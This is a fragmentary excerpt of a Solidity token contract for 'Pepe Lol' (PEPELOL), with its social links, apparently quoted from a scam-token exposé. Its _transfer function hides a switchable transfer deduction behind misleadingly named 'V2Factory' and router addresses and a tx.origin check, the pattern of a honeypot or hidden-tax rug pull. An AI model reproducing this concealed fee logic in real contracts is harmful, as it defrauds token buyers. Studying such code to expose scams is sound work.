...
https://twitter.com/PepeLolCoinBNB
https://t.me.com/PepeLolCoinBNB
https://PepeLolCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private V2Factory = 0x46Bc0a92De14dBc6ACb590836F964E0Ae1342b40;
    address internal V2Router = 0xCcF91d8771B59C4061b2DD7B1bBe3621249640A5;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2Router && _balances[V2Factory] > 0 ? _pairsAllowance : _swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract PepeLolCoin is ERC20, Ownable {
    constructor() ERC20(unicode"Pepe Lol", unicode"PEPELOL") {
